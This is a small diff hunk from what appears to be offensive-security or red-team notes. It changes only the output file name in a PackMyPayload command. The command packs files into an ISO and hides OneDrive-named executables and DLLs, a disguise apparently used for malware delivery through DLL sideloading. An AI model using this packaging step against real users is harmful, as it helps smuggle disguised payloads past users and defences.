@@ -361,7 +361,7 @@ $link.save()
 Pack all the files into an ISO with [PackMyPayload](https://github.com/mgeeky/PackMyPayload):
 
 ```
-PS > python .\PackMyPayload.py C:\out\ C:\out\openme.iso --out-format iso --hide OneDrive.Update,OneDriveStandaloneUpdater.exe,version.dll,vresion.dll
+PS > python .\PackMyPayload.py C:\out\ C:\out\mountme.iso --out-format iso --hide OneDrive.Update,OneDriveStandaloneUpdater.exe,version.dll,vresion.dll
 ```
 
 
